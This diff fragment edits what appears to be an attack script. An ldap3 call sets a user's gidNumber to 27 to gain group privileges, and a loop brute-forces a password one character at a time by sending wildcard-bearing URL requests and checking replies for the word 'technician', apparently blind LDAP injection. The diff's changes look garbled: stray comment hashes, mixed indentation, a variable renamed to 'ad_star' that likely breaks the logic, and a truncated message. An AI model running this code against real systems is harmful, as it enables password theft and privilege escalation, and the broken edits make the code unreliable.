@@ -17,8 +17,8 @@ connection.modify(
 	{"gidNumber": [(ldap3.MODIFY_REPLACE, ["27"])]},
 )
 
-##
-##
+####
+####
 
 
 import urllib.parse
@@ -37,14 +37,14 @@ def main():
             char = char.strip()
             ####
             char_encoded = urllib.parse.quote(char)
+	    ####	
 
             # Check if '*' is found and skip the first 6 '*' characters
             if '*' in char and skip_count > 0:
                 skip_count -= 1
                 continue
-            ####
 
-            if '*' in char and add_star:
+            if '*' in char and ad_star:
                 found_chars += char
                 print(f"[+] Found Password: {found_chars}")
                 if_star = False
@@ -53,7 +53,7 @@ def main():
             response = requests.get(modified_url)
             if "technician" in response.text and response.status_code == 200:
                 found_chars += char
-                print(f"[+] Found Password: {found_chars}")
+                print(f"[+] Found..: {found_chars}")
                 file.seek(0, 0)
 		    
 if __name__ == "__main__":
